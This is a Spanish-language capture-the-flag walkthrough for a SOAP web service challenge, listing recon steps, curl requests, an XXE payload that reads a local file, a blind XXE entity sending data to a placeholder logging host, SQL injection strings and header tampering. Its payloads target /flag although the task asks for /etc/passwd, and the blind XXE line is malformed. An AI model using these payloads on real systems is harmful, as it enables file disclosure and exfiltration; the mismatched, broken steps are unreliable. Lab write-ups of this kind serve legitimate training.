#### Description

The web project was rushed and no security assessment was done. Can you read the /etc/passwd file?

Additional details will be available after launching your challenge instance.
### **Solución** 

**Idea clave:** inspecciona el WSDL y las peticiones SOAP, luego prueba fallos típicos: XXE para leer archivos locales (`/flag`), manipular parámetros para ejecutar acciones no autorizadas, cambiar headers (`SOAPAction`, `Content-Type`) o usar deserialización insegura (payloads Java/.NET). Herramientas útiles: `curl`, `soapUI`, Burp, `xmlstarlet`.

1. **Recon — obtener WSDL / describir servicio**
    

`# si hay URL base: curl -s "https://HOST/service?wsdl" -o service.wsdl # o abrir endpoint en navegador: https://HOST/service?wsdl # listar operaciones (buscar <wsdl:operation> y <soap:operation>) grep -i "<soap:operation\|<wsdl:operation" -n service.wsdl || true`

2. **Probar una petición SOAP básica (ejemplo usando curl)**
    

`cat > req.xml <<'XML' <?xml version="1.0" encoding="UTF-8"?> <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"                   xmlns:ns="http://example.com/ns">   <soapenv:Header/>   <soapenv:Body>     <ns:someOperation>       <ns:input>test</ns:input>     </ns:someOperation>   </soapenv:Body> </soapenv:Envelope> XML  curl -s -X POST "https://HOST/service" \   -H "Content-Type: text/xml;charset=UTF-8" \   -H "SOAPAction: \"someAction\"" \   --data @req.xml -i`

Ajusta `someOperation`/`someAction` según el WSDL.

3. **XXE — intentar leer archivos locales (ej.: /flag)**  
    Inserta DOCTYPE con entidad externa en la petición:
    

`<?xml version="1.0"?> <!DOCTYPE foo [   <!ELEMENT foo ANY >   <!ENTITY xxe SYSTEM "file:///flag" >]> <soapenv:Envelope ...>   <soapenv:Body>     <ns:someOperation>       <ns:input>&xxe;</ns:input>     </ns:someOperation>   </soapenv:Body> </soapenv:Envelope>`

Enviar como en (2). Si el parser permite XXE, la respuesta contendrá el contenido del archivo.

4. **Blind XXE / exfiltration por HTTP**  
    Si no devuelven el contenido directo, exfiltra vía DNS/HTTP:
    

`<!ENTITY xxe SYSTEM "http://TU_DNS_LOGGER.example.com/?f=%file;]">`

Usa un servicio de logging de DNS/HTTP (o `ngrok`/servertest) y observa peticiones entrantes.

5. **Inyección/Manipulación de parámetros**
    

- Cambia valores de nodos para ver si hay control sobre consultas internas (p. ej. `userid` → `1 OR 1=1`).
    
- Si el backend construye queries a partir de XML sin parametrizar, prueba payloads SQL/XML injection:
    

`<ns:userid>1' or '1'='1</ns:userid>`

6. **SOAPAction / Headers / Content-Type trick**
    

- Algunos servidores enrutan por `SOAPAction`: intenta modificarlo para llamar operaciones internas:
    

`-H 'SOAPAction: "urn:adminAction"'`

- Cambia `Content-Type` entre `text/xml` y `application/soap+xml` si hay diferencias en cómo se procesa.
    

7. **Deserialización insegura (Java/.NET)**
    

- Si el servicio deserializa objetos (JAXB, XMLSerializer), intenta payloads que instancien clases peligrosas o ejecuten cargas útil RCE (vuln en commons-collections, etc.). Usa plantillas conocidas por framework (requiere adaptación).
    
- Observa `Content-Type` y namespaces para deducir stack (p. ej. `http://schemas.xmlsoap.org/soap/envelope/` vs `application/soap+xml`).
    

8. **Enumeración de operaciones / endpoints ocultos**
    

- Revisa WSDL por `soap:address location=".../admin"` u otros endpoints.
    
- Revisa `types`/`binding` por mensajes y estructuras que revelen parámetros secretos.
    

9. **Automatización y testeo con soapUI / Burp**
    

- Importa WSDL en soapUI y prueba operaciones fácilmente.
    
- Usa Burp Repeater/Intruder para iterar payloads (XXE, header fuzzing, parameter fuzzing).
    

10. **Validación final**
    

- Si obtienes salida con `picoCTF{...}` o `/flag` content, copia la flag y registra el payload exacto que la devolvió (XML enviado + headers).
    

---

### **Notas adicionales**

- XXE funciona si el parser permite entidades externas y no está mitigado (disable DOCTYPE o usar parser seguro).
    
- Blind XXE por DNS/HTTP útil cuando respuesta no retorna archivos.
    
- Deserialización RCE es poderosa pero depende del stack (Java vs .NET) y requiere payloads específicos.
    
- Siempre prueba en la instancia del reto; no uses estas técnicas en sistemas no autorizados.
    
- Herramientas clave: `curl`, `soapUI`, Burp Suite, `xmlstarlet` (para validar/transformar XML), servicio de DNS logging (burpcollaborator, interact.sh).
    

---

### **Referencias**

- OWASP — XXE Prevention Cheat Sheet.
    
- SOAP-specific testing guides — soapUI docs / Burp docs.
    
- PayloadsAllTheThings — XXE / SOAP / deserialization examples.
    
- `xmlstarlet` — manipulación/validación XML en CLI.